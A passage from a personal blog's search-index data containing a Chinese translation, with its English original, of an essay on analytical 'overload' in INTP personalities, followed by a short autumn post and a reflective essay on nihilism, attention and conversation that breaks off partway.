同时，不断收集那些微小的快乐，你会过得更好。\nChapter 2: Overload（原文） (WHAT\u0026rsquo;S NEW: 10/23/15\u0026ndash;I\u0026rsquo;ve been away for a good bit grappling with new challenges and the next stage of life struggles. But I\u0026rsquo;m coming back with a new article, and a new idea! It\u0026rsquo;s about the INTP drive for creation and achievement. Along with the new article, I\u0026rsquo;d like to create a page dedicated to INTPs supporting other INTPs in business. If you need a product or service, why not go to another INTP?? You know will get a person who understands your approach to the world!)\nI\u0026rsquo;ll admit it. I like being an INTP very much. It\u0026rsquo;s a state of being that puts some nice tools in your hands. However, it also brings some potent blind spots and traps. And usually, the dangers you can\u0026rsquo;t see tend to be the ones that cause you the most grief. It\u0026rsquo;s like getting hit by Wonder Woman\u0026rsquo;s invisible jet plane. As you\u0026rsquo;re lying mangled on the ground, all you can see are clear skies overhead.\nToday I\u0026rsquo;m going to focus on overload. It\u0026rsquo;s a very insidious INTP trap, because the path to overload covers the same ground as our most loved and valued INTP analytical functions. As a result, the more you try to solve that unhappiness with the tools at your disposal, the deeper you dig yourself. As is often the case in life, our greatest strength can be our greatest weakness.\nLet\u0026rsquo;s say you\u0026rsquo;re a proto-human walking from your cave for the first time. The world is fresh and wide-open. You feel this interesting sensation on your skin that bright, summer day. Today, in English, we would call the sensation \u0026ldquo;heat.\u0026rdquo; Another morning, you walk out of your cave, and you feel a different sensation. The sky is cloudy with a stiff wind. We would call that one \u0026ldquo;cold.\u0026rdquo; These two sensations perplex you. What makes you feel these differences? Is some kind of unseen spirit possessing your body? Was it something you ate? Your mind flips into analysis mode.\nYou note that the big shining orb in the sky makes an even stronger sensation on your skin when it hits you. When you step into the shade, the feeling lingers in your skin a bit, then goes away. Interesting. Maybe the soil and trees and rocks absorb something from the orb and release it back into the air. Maybe the orb causes heat.\nBut wait. Over time, you notice the effect of seasons. Each day doesn\u0026rsquo;t heat and cool the same way. Sometimes it\u0026rsquo;s hot even at night. Sometimes it\u0026rsquo;s cold with a bright sun. The conundrum deepens. After climate, you study air currents, ocean temperature, global water currents, the orbit of the Earth, solar flares, the ozone layer. On and on and on and on. Every new discovery factors in and opens new possibilities. But as you delve and find more and more questions to answer, you eventually begin to approach an overall limit of energy. The observations and hypotheses mount. The complexity of the problem starts to breed a sort of paralysis or surrender. We begin to label the overall conundrum as not reasonably solvable. It\u0026rsquo;s like staring over a chasm at an ice cream stand. As much as we want a banana split, we believe we\u0026rsquo;ve amassed sufficient information to determine that realistically we just can\u0026rsquo;t get there. For an INTP, everything has the ability to spiral into an overload situation. But there is one area that seems to be a quagmire more than any other. My first article focused on it\u0026ndash;interpersonal relationships and isolation.\nIf you feel isolated, I bet that you can regurgitate the huge amount of information and analysis you\u0026rsquo;ve amassed on the subject. You could tell me about the friction in your childhood. How your parents didn\u0026rsquo;t seem to get you. How when you said this, they heard that. You could give me your theories. Your observed truths. The way your relationship with your college roommate started with great promise, but cooled and ended up with you being increasingly alienated. You\u0026rsquo;ve deconstructed your interactions. Theorized about what kind of person you need to find and where you might find them. You can tell me how many times you were hopeful that you found one, but then a progression of events proved that you were mistaken.\nAll of this information builds into an ever-growing conceptualization of the problem. Why does it grow? Because we want to solve problems exactly and fully, and nothing else will suffice. As we apply each potential solution and step back to observe the result, we\u0026rsquo;ll take each point of failure as a new challenge to be analyzed. It\u0026rsquo;s our rational optimism at work. A solution must exist, we just have to try harder.\nThe trap of INTP is that your thorough and unflinching approach to solving problems inherently increases their size. Size, in turn, begins to empirically prove that the solution may be impossible or beyond your abilities. So what do you do? You try HARDER. The complexity of the problem grows. HARDER YET. Bigger. The building overload spawns negative emotions. Fatigue, frustration, and disappointment mount, finally fermenting into despair.\nNowhere do INTPs seem to fall victim to overload more profoundly than in interpersonal relationships. The most likely reason is that relationships involve a great deal of tricky emotional content. You have your own emotions to contend with (even if you\u0026rsquo;re convinced that you don\u0026rsquo;t have any), as well as the other person\u0026rsquo;s. Since INTPs would rather suppress emotions than embrace them (which actually is an emotion-driven decision), we have a need for skills that we aren\u0026rsquo;t terribly eager to master. But let\u0026rsquo;s tackle the problem of interpersonal relationships in the most logical place. Us. Since our own emotions ultimately control whether we have the experience of enjoying life or being tortured by it, our own emotions are the place to start.\nWhat I\u0026rsquo;m proposing is really very simple. However, it\u0026rsquo;s foreign to usual INTP thinking. If overload is created by being exacting and looking too big, then happiness can achieved by being less exacting and going small. But here\u0026rsquo;s the catch. Small means pieces, not grand solutions. Discrete little victories. Each one might not amount to much, but if you walk around collecting pebbles, you will eventually have a sack of pebbles as heavy as a boulder.\nSo, how do we narrow our focus in interpersonal relationships? Let\u0026rsquo;s say you know someone who you\u0026rsquo;ve spent time with, and although you once hoped that this person would be a kindred spirit, you\u0026rsquo;ve determined that it\u0026rsquo;s never going to happen. You\u0026rsquo;ve observed too much incongruity. The person let you down too many times. But now you have an opportunity to have a cup of coffee with this person. Your rational brain says, \u0026ldquo;why bother? I\u0026rsquo;ve already established that this person isn\u0026rsquo;t a kindred spirit. I\u0026rsquo;m just going to be further disappointed. I\u0026rsquo;m going to come away feeling worse than if I didn\u0026rsquo;t spend time with them at all.\u0026rdquo; That is overload talking. Perhaps there is some part of this person that you enjoy. Maybe over coffee, you\u0026rsquo;ll end up joking around. Maybe there is something that the two of you can commiserate on. If you just look at the joking or the commiserating, you can enjoy being with this person for a short time. You feel a slice of happiness, because in that moment, you are feeling good.\nI submit to you that feeling bad is bad, and feeling good is good. Even though the cup of coffee does not solve the problem of your place in the world, you can feel happy for that half hour in the coffee shop. And that is meaningful. That is good. Did you solve the problem? No. Did you determine that this person is actually a kindred spirit after all? No. It\u0026rsquo;s an imperfect solution. A partial solution. But remember that bag of pebbles. I\u0026rsquo;m trying to get you working on that sack of pebbles.\nBe mindful of where you have opportunities to experience small moments of happiness. When you go collect one, make yourself step back from the exacting, rational machinations of your brain. Be more aware of your emotional state. Fight the urge to leap to negative emotions if little setbacks happen during the experience. Collect more and more of these moments with the goal of building some stability and future predictability. Establish which friends you can call upon for what. By having options for small victories, you have a means to achieve more happiness.\nWhat I\u0026rsquo;ve just described will certainly seem like a no-brainer to other personality types. But to INTPs, it\u0026rsquo;s not natural. It\u0026rsquo;s an effort. And let me be clear. It\u0026rsquo;s NOT the answer to our isolation. As an INTP, I\u0026rsquo;m still convinced that we are, in fact, isolated. However, even though it\u0026rsquo;s not solving the problem, what it does achieve is some much needed training, experience, and success for our emotional side. Emotions are much more subject to our control than we realize. They are not simply the result of a situation. We have a huge amount of opportunity to make choices regarding how we feel. But in order to do it, we have to stop making the mistake in interpreting emotions as an indication of truth.\nAll personality types misinterpret the message of emotions. That\u0026rsquo;s just part of being human. For example, if you are afraid in a dark room because there might be someone hiding in your closet, that does not mean that someone IS hiding in the closet. But that\u0026rsquo;s not what our brains tell us in the moment, right? It feels like there COULD be someone in the closet because we are afraid. The emotion is interpreted as an important indicator of possible fact. Just like our five sensory emotions. If you feel radiant heat, you don\u0026rsquo;t touch the stove. If you feel scared, there must be something scary out there. Emotion shapes our sense of reality.\nThe same can happen with isolation. Are we feeling down because we are isolated (reality indicating), or are we feeling down first and incorrectly assuming that isolation must be the objective reason (reality creating)? I believe that the latter is happening a great deal. Isolation is partly true and partly false as a result of emotions that have become mired in overload. If we can unwind the false part, we can strike a much better emotional balance. Maybe we are less isolated than we think. Maybe there is much more that we deserve to be happy about.\nIn the end, a solution to the grand problem may still exist. There\u0026rsquo;s always hope. And without overload and the weight of spiraling failure, that hope can breathe and be healthy. In the meantime, though, collect those pebbles. You\u0026rsquo;ll feel much better in the end.\n","permalink":"https://ret2neo.cn/mind/221127-intp-series-2/","summary":"本文翻译自：http://www.intpexperience.com/Overload.php\n原文域名已过期，可使用cache查看：https://web.archive.org/web/20230219221929/www.intpexperience.com/Overload.php\n第二章：过载（译文） 实话说，我非常喜欢作为INTP的自己，这样的存在就像是有神兵利器在手。然而，这样的存在也有相应的盲点和陷阱。并且往往，看不见的危险带来最大的伤害，就像被神奇女侠的隐形喷气式飞机击中，伤痕累累躺着，抬头却只见到清澈的天空。\n今天，我要关注过载这个话题。这是一个非常隐秘的INTP陷阱，因为过载是由我们最喜欢和珍视的分析功能导致的。你越用分析功能尝试解决自己的不快乐，你伤自己越深，你的铠甲也是你的软肋。\n让我们做个思想实验。现在你是一个刚走出洞穴的原始人，世界对你是全新的、完全开放的。这是一个炎炎夏日，你的皮肤感受到一种有趣的感觉，今天我们管这种感觉叫做“热”。另一个早晨，你走出洞穴，你感觉到一种不同的感觉，天空阴沉，寒风如刀，我们今天管这个叫“冷”。这两种感受困扰着你，是什么使你感受到这些不同？是某种看不见的神明在操纵你的身体吗？还是因为你吃了什么？你的大脑进入了分析模式。\n你注意到天空中闪亮的大球照到你的时候，你的皮肤感受到一种更强烈的感觉，而当你走进阴影，皮肤上的感觉渐渐消失。有点意思，也许是土壤、树木和岩石从大球中吸收了什么，又把它释放到空气中。也许是大球造成了“热”。\n但是且慢，你日渐注意到季节变换，每天的冷热都不同，有时夜里甚至很热，有时天晴却很冷。你感到越发困惑。从关注气候开始，你又逐步开始研究空气流动、海洋温度、全球水流、地球轨道、太阳耀斑和臭氧层，诸如此类。每个新发现都带来更多的可能性。但随着你钻研深入，找到了越来越多问题的答案，最终你开始慢慢接近自身能量的极限。观察和假想日渐堆积，问题的复杂性引发麻痹和妥协，我们开始将那些困惑标记为不可解决，我们觉得自己已经积累了足够多的信息，足以推断自己无法达到问题解决的彼岸了。对于INTP，对任何主题的长期关注最终都可能将我们引入过载的困境，但有一个领域似乎更容易成为泥潭，那就是上一篇文章说的，人际关系和疏离感。\n如果你感到疏离，我打赌你能拿出一大堆你在这个主题上收集的信息和做出的分析。你能说出一大堆童年阴影，原生家庭父母的忽视和误解，你能给出你的理论。你观察到许多真相。你和大学舍友的关系从亲密承诺开始，到日渐疏远，最终被孤立。你解构自己和世界的互动，构建起一套关于你需要找到哪一类人以及可以在哪里找到他们的理论。你还可以说出来，不止一次，你觉得自己找到了那个人，但随后某个事件又证明自己搞错了。\n所有这些信息构建起关于问题的日渐庞大的概念。为什么问题越来越复杂了呢？因为我们想要精确又完全地解决这些问题，否则我们不会感到满足。我们不断尝试可能的解决办法然后回过头来观察结果，我们又把每次失败看作一个新的可供分析的样本，周而复始。这就是我们的理性乐观，我们觉得解决方案一定存在，我们只是需要更努力一些。\nINTP的陷阱在于你彻底的坚定不移的对解决问题的尝试实质上增加了问题本身的复杂度。而这种复杂性又会反过来告诉你问题不可解决，或者至少超出你的能力范围了。然后呢，你会怎么做？你更加用力了。随着问题的复杂性的增加，你更用力地分析他们。这种滚雪球式的信息过载会催生很多负面情绪，疲惫、沮丧、失望日渐堆积，最终，你会走向绝望。\nINTP最容易在人际关系领域陷入深深的过载。最可能的原因是，关系涉及情绪，而情绪不可捉摸。你要处理自己的情绪（即便你觉得自己没什么情绪波动），还要处理别人的情绪。因为INTP比起拥抱情绪，更倾向于压抑情绪（尽管这也是一个情绪驱动的决定），所以虽然我们不那么渴望拥有相关技能，但实质上我们需要。那么让我们来以最符合逻辑的方式来解决人际关系的问题。鉴于我们自身的情绪最终决定了我们是享受生活还是被生活折磨，我们就从自身情绪出发来考虑这个事情。\n我的提议非常简单，但对INTP的思维模式来说会很陌生。如果过载是由于追求精确和关注点过大导致的，那么幸福就可以通过不那么严苛和着眼于细微之处来实现。值得一提的是，关注点更小意味着你会得到碎片化的而不是宏大的解决方案，离散的细微的成功，尽管每一次都很微小，但聚沙成塔，最终也能收获颇丰。\n所以，如何缩小我们在人际关系上的关注点呢？假设说你和某人有过一些交往，尽管你曾期望这是个能有共鸣的灵魂，但你观察到了太多的不协调，于是认为共鸣不会发生。现在你有机会和这人再喝几杯咖啡，你的理智脑说“何必呢，我早知道这人并不投缘，一起呆完我只会更沮丧，不如不去”。这就是过载型思维。也许这人身上的某个部分你会喜欢，也许通过一起喝杯咖啡你们能够开开玩笑，也许某些事情你们可以共情。如果你仅仅只是寻找玩笑或者共情，你就可以享受这人短暂的陪伴。你感到一丝丝快乐，因为在这个瞬间，你感觉良好。\n我想告诉你，感觉不好本身就不好，感觉好本身就是好的。尽管一杯咖啡无益于解决你在世上的问题，但至少你在咖啡店里面的那半个小时感到开心。这就是有意义的。这就是好的。你解决问题了吗？没有。你最终会认为这人是个志趣相投的灵魂吗？不会。这不是一个完美答案，这是局部优解，是权宜之计。但积少成多，这都是你的收获。\n留心那些可以让你体验到短暂快乐的机会。当你去体验这个快乐的时候，放松你严苛的理性的大脑。更多关注自己的情绪状态。如果在体验过程中遇到小挫败，克制进入负面情绪的冲动。收集越来越多这样的时刻，以此构建一定的稳定性和未来的可预测性。搞清楚哪些朋友是你可以出于什么原因去拜访的。通过让成功获取小的快乐成为生活的一种选择，你就拥有了获取更多快乐的方法。\n我刚刚所描述的东西对其他人格来说可能显得非常无脑。但对INTP来说，这并非自然而然的，这需要努力。让我再说清楚一点儿，这不是疏离感的答案。作为INTP，时至今日我仍然相信，本质上，我们是疏离的。（译者注：如果一个成熟的INTP仍然觉得是这样的。那么，有一种可能，某种程度上，你感到和世界的疏离，不是因为你有什么缺陷。而只是因为你太聪明了，而又太过固执了。世界中个体的本质是分离的，唯一区别是其中的个体是否感受到这种分离。没有疏离感或者疏离感较弱的人，是对这种个体间的分离不那么敏感、没有强烈感受的人，能够容忍幻象，并在幻象中忘却真实，而你，INTP，你时不时跳出来，总是记得真相，总是强烈而自觉地感受到一切事物人之间的分离性，总是对亲密保持怀疑和警惕，总是无法感到真正的联系。这是你的幸运，也是你的悲哀。你是黑客帝国中选择了红药丸的角色，你注定过清醒而痛苦的生活。如果一切没有解，那么请你拥抱真实的自我，同时，也对自己好一点，不必过于严苛，时不时找一点儿微小的乐子，去码头整点薯条，没有关系的，不要太执着。如果一切有解，那么唯一解就是向某个人事物臣服，暴露你的缺陷，献祭你的自由，获得它的认可，接受它的拥抱，同时承担它抛弃你的危险。做到这一切也并不难，唯一需要的是勇气。）然而，尽管这些做法没有解决问题，但他们确实在情绪方面帮助我们达成了一定的训练、经验和成功。情绪比我们想象的更可控，他们只是情境的产物。我们有很多机会根据自己的感受做出决定，但我们首先要停止犯一个错误，那就是将情绪解释为在暗示某种事实。（译者注：这里的意思大约是，不要将情绪看得过于重要，他是没有深意的，变动不居的，稍纵即逝的，仅仅是环境的产物，能够说明一些问题，但仅仅是很浅层的问题，是不值得深入挖掘和分析的。太过严肃对待只会使我们疲惫。）\n所有人格类型都会曲解情绪传递出来的信息。情绪仅仅是人性使然。举例来说，你在黑暗的房间里面感到害怕，因为你觉得暗处可能有人，但这并不意味着暗处真的有人。但在当时大脑不这么想。它觉得我们感到害怕是因为暗处很可能确实有人。情绪会被解释成对事实的暗示。拿人的五感（视觉、听觉、嗅觉、味觉、触觉）举例，如果你看到火炉热得发光，你就不会去触碰它。同理，如果你感到恐惧，一定是有什么恐怖的东西。情绪塑造了我们对于现实的感知。\n情绪塑造了我们对于现实的感知，这一点对于疏离感也适用。我们是因为疏离而感到沮丧，还是我们先感到沮丧，然后错误地假设疏离是背后的客观原因。我想常常发生的是后者。疏离感一半是真实的一半是想象的，因为那时情绪本身已经不堪重负。如果我们能摆脱想象的那部分疏离感，我们就能达到更好的情绪平衡，避免失控。也许我们没有自己想象中的那么疏离，也许有相当多值得我们感到开心的事物。\n最后，对于大哉问的解决方案也许依然存在。永远充满希望。并且如果没有过载和螺旋式失败的重负，这种希望将更健康。与此同时，不断收集那些微小的快乐，你会过得更好。\nChapter 2: Overload（原文） (WHAT\u0026rsquo;S NEW: 10/23/15\u0026ndash;I\u0026rsquo;ve been away for a good bit grappling with new challenges and the next stage of life struggles. But I\u0026rsquo;m coming back with a new article, and a new idea! It\u0026rsquo;s about the INTP drive for creation and achievement. Along with the new article, I\u0026rsquo;d like to create a page dedicated to INTPs supporting other INTPs in business.","title":"【翻译】INTP系列二：过载"},{"content":" 杏叶黄，易水寒，时代伟大，个人渺小。转眼两年，时境变迁，再读此文，百感交集。\n","permalink":"https://ret2neo.cn/mind/221126-yet-another-autumn/","summary":"杏叶黄，易水寒，时代伟大，个人渺小。转眼两年，时境变迁，再读此文，百感交集。","title":"又是一年杏叶黄"},{"content":" 壬寅十月既望，我同另一位虚无主义者有一场对话。我们聊了不少，时不时地，一些蛮有趣的想法会冒出来，一场像样的谈话应当如此。\n事后我想，一个健康的虚无主义者应当是进步的。\n人是自由的，人可以选择。人必须选择行动，因为沉湎和停滞即是消亡和毁灭。一个健康的虚无主义者应当是行动的，而他们又根本不在意方向，那么任何行动都会是向前进的。所以，坚持行动，保持进步，是虚无主义者保持健康的秘诀。如果你停下不动，黑暗就会一点点吞噬你。\n对话带来什么 我们结缘于如果青年的36h的生活实验室。我们反思这个活动本身，紧凑节奏所营造出的高涨热情，在曲终人散之后隐隐显示出空虚的本来面目。这种形式的表达（或者扩展开来，所有形式的表达）是否可能只是一场自high？疑似充实过后，兴奋褪去后的疲惫之下，究竟有什么被真正留下？难道这只是一期一会的“戒酒互助会”，人们互相倾诉自己在戒断孤独、迷恋、空虚、成瘾、迷茫、焦虑等形形色色不健康的情绪的道路上的所见所闻所感，互相打气加油，人们把手中的微弱火苗凑到一起，艰难共度一日。散场之后，昏黄路灯之下，黯淡群星之中，你又是你，独自怅然。\n这样看来，未免可悲。不妨积极一些。对话和读书不同，对话中人的注意力是流动的，对信息的接收和处理效率不如后者，因此比起读书，很容易产生一种一无所得的虚幻感。你也许知道一些观点作为种子种在了你的心里，生根发芽，将来某时某地会结果落地，但你不知道究竟是什么被种了下去，因此一场狂欢过后，仍觉少点什么。对话的好处只在于这是一个激发灵感和共同创作的过程，在一场有质量的对话中，因为有价值的输入，你极有可能冒出来独自散步或者阅读的时候所不会有的想法。这就是对话的价值。\n当然，谈话的对象也很重要。同聪明的人谈话的好处在于他们不会觉得被冒犯，他们没有那么强的成见与定见，愿意理解你是在谈论事情本身，并用逻辑和开放的心态同你共同完成一次即兴会话。\n一场对话过后，比起自己说过什么，你会更记得别人说了什么 这是我第一次意识到这一点，细想之下，确实如此。（当然，完全有可能是因为我们是同一类人，都喜欢了解和分析别人观点的人，所以谈话中注意力都在别人的语言上，也因此有类似的感受）。这是否意味着，一个人的语言只能改变别人而无法改变自己，就像一个古老的故事描述的那样，天堂和地狱中的人们都拿着很长的筷子围着就餐，不同的是天堂的人会互相给桌对面的人夹菜。语言是否也是如此，比起用表达改变自己，通过表达影响他人是更可能发生的。而伟大思想家的伟大之处就在于能够分饰两角，在和自我的对话中发现至关重要的真理。\n寻求确定 我们所做的大部分事情，是在寻求确定性。对安全感的追求驱使我们做出不少匪夷所思背离本性的事情，其中不乏有些病态的行动。对我来说，过度分析就是其中之一。这世上的确定性能有多少，孜孜不倦的分析这个动作本身就是极为病态的，你期待自己有什么高明的见解，发现什么了不起的真理吗？大可不必，你只是觉得不安全。不必像一个紧张惊恐的小孩一样警觉地观察分析自己的处境，要像水一样，拥抱生活的一切形态。\n自我暴露与疏离感 如果不以真我示人，你就不会真正投入真心，你戴着面具，保持安全，随时可以离开，那么任何亲密都无从谈起。\n征服与包容 也许受《色戒》影响，从前我一直觉得两性之间的自然关系是征服与臣服。但在看过《The Way of the Superior Man》后，我意识到女性力量如同大地，如同海洋，汹涌澎湃没有方向，但确实蕴含着巨大能量，从前的观点并不全然适用。\n注意力即问题 关注本身，会成为问题。有点像量子力学中的“观察导致坍缩”，现实生活中注意力的投射点本身也会成为影响系统的重要因素。有一些事情，如果你不在意，它就会过去，你越关注，它越显著，比如吞咽口水，比如呼吸，比如生活的意义。\n我领悟到，恰如欲望使人感到快乐或者痛苦，正是注意力给人带来智慧或者烦恼。恰如快乐和痛苦一体两面，烦恼和智慧也是一体两面。使前者转化的是欲望，使后者转化的是注意力。专注的注意力和有条理的思考会带来智慧，分散的不停流动的注意力和被动应对不够深入的思考会带来苦恼。是否能够正确选择投射注意力的对象决定了你是收获智慧还是囿于烦恼。\n所以，要像注重欲望的生灭一样注重注意力的流转，注视它们，分析它们，记录它们，掌控它们。\n水流与《悉达多》 我们在海边交谈，见到流水，我又开始想了解悉达多究竟从河水中学到什么。于是又一次，我谈起悉达多的前半生，谈起他如何决定步入世俗，如何决定不再将生活视为表象，又是如何最终离开世俗回到河边。谈完之后，我口干舌燥，觉得没有必要说起这些。我问自己，你总要寻求深刻吗？那些啊哈时刻除了将一些看似有趣的观点围成一个茧房使你舒适外，还带来些什么？你因此而感到多少快乐吗？\n忽然想到，也许悉达多从水流中所理解到的，就是欧文亚隆在《存在主义心理治疗》一书末尾所说“死亡、自由、孤独都必须直接处理。但是当面对无意义问题之时，有效的治疗师必须帮助病人将视线从这个问题上转移；接受参与（参与生活、参与关系）的解决之道，而不是沉浸在无意义感的问题之中。正如佛陀所教导的，追问生命的意义并无教益。人必须让自己沉浸在生活的洪流之中，让疑问随水流逝”。无意义与生命同在，不可根治，不必治疗。\n所以，说来可笑可悲，却可能是真的，整个生命中最大的苦恼，就是将注意力集中在并无教益的地方，而最大的智慧，就是将注意力从上面移开。\n轻松一点儿 《让子弹飞》里的小弟们都觉得跟着张麻子的日子，确实挺开心，但是确实也不太轻松。轻松，也许是生活中比较重要的一个事情，存在已经如此沉重，没有必要的情况下还是轻松一点儿好。因此我想，可能还是不太健康。如此良夜妙人明月海风，我们可以谈论的有很多，却在说无聊而没有出路的悉达多。\n能量储蓄与社会不朽 回忆起36h生活实验室中冒出的一个想法，略做记录。我们聊到人的能量会有高低起伏，突发奇想是否可能在能量高的时候存储下来，在能量低的时候再充进去。乍一听，这似乎是无稽之谈。但猛然间我想到胡适的“社会不朽理论”，大致意思是，社会中一切个体的行为都会朽灭，但个体行为对他人和整个社会的影响会层层传导，绵延不绝，社会作为一个整体不朽不灭，至于无穷。那么，如果社会是一个巨大的人性能量充电宝，那么日行一善和为非作歹就好像是在给整个社会充电和放电。整个系统以一种缓慢但是总体有效的方式在工作，你向社会注入善意，世界因此变得更好，将来某日消沉失意时也有可能从美好世界感受到一点善意，从而能够坚持下去。这岂不是正应了那句“只要人人都献出一点爱，世界就会变成美好的人间”。\n你为何出门？ 我问过很多人这个问题。最近有一天，我得到一个诚实的答案，“我有时觉得空虚”。无论你尝试获得什么，本质上是你觉得缺少。这等于没有回答，但又是一个无比正确的答案。你感受不到那种本自具足，所以你寻找，而如果你感受到了，那么死亡就不遥远了。“我觉得空虚”，这里没有花里胡哨的故事，没有自欺欺人的说法，直击灵魂，直抵人心。也许，填补空虚，期待理解，需要认可，想要赞同，就和觉得饥饿，感到口渴，想要大号，急需小便一样，就是真相本身，就是事物本来，并不高尚，也不卑劣，既不光荣，也不可耻。无需探究背后有什么，探究也不会有结果，无非是找到更多的说法，但也不过是说法，因为背后，没什么特别。继续解构下去，就是生化反应，这对于让你理解一切，更好在其中运转下去，有什么好处吗？没有多少，收益极低，徒增烦恼。\n反思与改进 思维活跃者适合在散步中交谈，大部分人适合在咖啡屋里交谈。我其实还是不够坦诚，不敢完全直面自己，希望以后能慢慢改进。\n走向开放世界 从前我有很多想法，但几乎从不开口，倒是写了不少日记。这不太好。哪怕是这个小小的公众号，也有读者觉得我翻译的某篇文章不错，私信说希望能继续翻译该系列的后续文章，也有读者给我的文字打赏，这都让我挺开心，觉得生活有所期待，有些事情值得一做，郁郁寡欢之中也多了一丝能量。所以我还是觉得，人必须走向开放。就像对话为思想注入变量一样，开放为生活注入变量。走向开放的唯一方式是行动，移动、发言、观察、领悟、模仿、挑战，做任何克服停滞的行动。世界会像一场无限游戏不断展开，而你会走向前所未见的境地。这一切，就是生活。\n","permalink":"https://ret2neo.cn/mind/221122-making-progress-as-nihilist/","summary":"壬寅十月既望，我同另一位虚无主义者有一场对话。我们聊了不少，时不时地，一些蛮有趣的想法会冒出来，一场像样的谈话应当如此。\n事后我想，一个健康的虚无主义者应当是进步的。\n人是自由的，人可以选择。人必须选择行动，因为沉湎和停滞即是消亡和毁灭。一个健康的虚无主义者应当是行动的，而他们又根本不在意方向，那么任何行动都会是向前进的。所以，坚持行动，保持进步，是虚无主义者保持健康的秘诀。如果你停下不动，黑暗就会一点点吞噬你。\n对话带来什么 我们结缘于如果青年的36h的生活实验室。我们反思这个活动本身，紧凑节奏所营造出的高涨热情，在曲终人散之后隐隐显示出空虚的本来面目。这种形式的表达（或者扩展开来，所有形式的表达）是否可能只是一场自high？疑似充实过后，兴奋褪去后的疲惫之下，究竟有什么被真正留下？难道这只是一期一会的“戒酒互助会”，人们互相倾诉自己在戒断孤独、迷恋、空虚、成瘾、迷茫、焦虑等形形色色不健康的情绪的道路上的所见所闻所感，互相打气加油，人们把手中的微弱火苗凑到一起，艰难共度一日。散场之后，昏黄路灯之下，黯淡群星之中，你又是你，独自怅然。\n这样看来，未免可悲。不妨积极一些。对话和读书不同，对话中人的注意力是流动的，对信息的接收和处理效率不如后者，因此比起读书，很容易产生一种一无所得的虚幻感。你也许知道一些观点作为种子种在了你的心里，生根发芽，将来某时某地会结果落地，但你不知道究竟是什么被种了下去，因此一场狂欢过后，仍觉少点什么。对话的好处只在于这是一个激发灵感和共同创作的过程，在一场有质量的对话中，因为有价值的输入，你极有可能冒出来独自散步或者阅读的时候所不会有的想法。这就是对话的价值。\n当然，谈话的对象也很重要。同聪明的人谈话的好处在于他们不会觉得被冒犯，他们没有那么强的成见与定见，愿意理解你是在谈论事情本身，并用逻辑和开放的心态同你共同完成一次即兴会话。\n一场对话过后，比起自己说过什么，你会更记得别人说了什么 这是我第一次意识到这一点，细想之下，确实如此。（当然，完全有可能是因为我们是同一类人，都喜欢了解和分析别人观点的人，所以谈话中注意力都在别人的语言上，也因此有类似的感受）。这是否意味着，一个人的语言只能改变别人而无法改变自己，就像一个古老的故事描述的那样，天堂和地狱中的人们都拿着很长的筷子围着就餐，不同的是天堂的人会互相给桌对面的人夹菜。语言是否也是如此，比起用表达改变自己，通过表达影响他人是更可能发生的。而伟大思想家的伟大之处就在于能够分饰两角，在和自我的对话中发现至关重要的真理。\n寻求确定 我们所做的大部分事情，是在寻求确定性。对安全感的追求驱使我们做出不少匪夷所思背离本性的事情，其中不乏有些病态的行动。对我来说，过度分析就是其中之一。这世上的确定性能有多少，孜孜不倦的分析这个动作本身就是极为病态的，你期待自己有什么高明的见解，发现什么了不起的真理吗？大可不必，你只是觉得不安全。不必像一个紧张惊恐的小孩一样警觉地观察分析自己的处境，要像水一样，拥抱生活的一切形态。\n自我暴露与疏离感 如果不以真我示人，你就不会真正投入真心，你戴着面具，保持安全，随时可以离开，那么任何亲密都无从谈起。\n征服与包容 也许受《色戒》影响，从前我一直觉得两性之间的自然关系是征服与臣服。但在看过《The Way of the Superior Man》后，我意识到女性力量如同大地，如同海洋，汹涌澎湃没有方向，但确实蕴含着巨大能量，从前的观点并不全然适用。\n注意力即问题 关注本身，会成为问题。有点像量子力学中的“观察导致坍缩”，现实生活中注意力的投射点本身也会成为影响系统的重要因素。有一些事情，如果你不在意，它就会过去，你越关注，它越显著，比如吞咽口水，比如呼吸，比如生活的意义。\n我领悟到，恰如欲望使人感到快乐或者痛苦，正是注意力给人带来智慧或者烦恼。恰如快乐和痛苦一体两面，烦恼和智慧也是一体两面。使前者转化的是欲望，使后者转化的是注意力。专注的注意力和有条理的思考会带来智慧，分散的不停流动的注意力和被动应对不够深入的思考会带来苦恼。是否能够正确选择投射注意力的对象决定了你是收获智慧还是囿于烦恼。\n所以，要像注重欲望的生灭一样注重注意力的流转，注视它们，分析它们，记录它们，掌控它们。\n水流与《悉达多》 我们在海边交谈，见到流水，我又开始想了解悉达多究竟从河水中学到什么。于是又一次，我谈起悉达多的前半生，谈起他如何决定步入世俗，如何决定不再将生活视为表象，又是如何最终离开世俗回到河边。谈完之后，我口干舌燥，觉得没有必要说起这些。我问自己，你总要寻求深刻吗？那些啊哈时刻除了将一些看似有趣的观点围成一个茧房使你舒适外，还带来些什么？你因此而感到多少快乐吗？\n忽然想到，也许悉达多从水流中所理解到的，就是欧文亚隆在《存在主义心理治疗》一书末尾所说“死亡、自由、孤独都必须直接处理。但是当面对无意义问题之时，有效的治疗师必须帮助病人将视线从这个问题上转移；接受参与（参与生活、参与关系）的解决之道，而不是沉浸在无意义感的问题之中。正如佛陀所教导的，追问生命的意义并无教益。人必须让自己沉浸在生活的洪流之中，让疑问随水流逝”。无意义与生命同在，不可根治，不必治疗。\n所以，说来可笑可悲，却可能是真的，整个生命中最大的苦恼，就是将注意力集中在并无教益的地方，而最大的智慧，就是将注意力从上面移开。\n轻松一点儿 《让子弹飞》里的小弟们都觉得跟着张麻子的日子，确实挺开心，但是确实也不太轻松。轻松，也许是生活中比较重要的一个事情，存在已经如此沉重，没有必要的情况下还是轻松一点儿好。因此我想，可能还是不太健康。如此良夜妙人明月海风，我们可以谈论的有很多，却在说无聊而没有出路的悉达多。\n能量储蓄与社会不朽 回忆起36h生活实验室中冒出的一个想法，略做记录。我们聊到人的能量会有高低起伏，突发奇想是否可能在能量高的时候存储下来，在能量低的时候再充进去。乍一听，这似乎是无稽之谈。但猛然间我想到胡适的“社会不朽理论”，大致意思是，社会中一切个体的行为都会朽灭，但个体行为对他人和整个社会的影响会层层传导，绵延不绝，社会作为一个整体不朽不灭，至于无穷。那么，如果社会是一个巨大的人性能量充电宝，那么日行一善和为非作歹就好像是在给整个社会充电和放电。整个系统以一种缓慢但是总体有效的方式在工作，你向社会注入善意，世界因此变得更好，将来某日消沉失意时也有可能从美好世界感受到一点善意，从而能够坚持下去。这岂不是正应了那句“只要人人都献出一点爱，世界就会变成美好的人间”。\n你为何出门？ 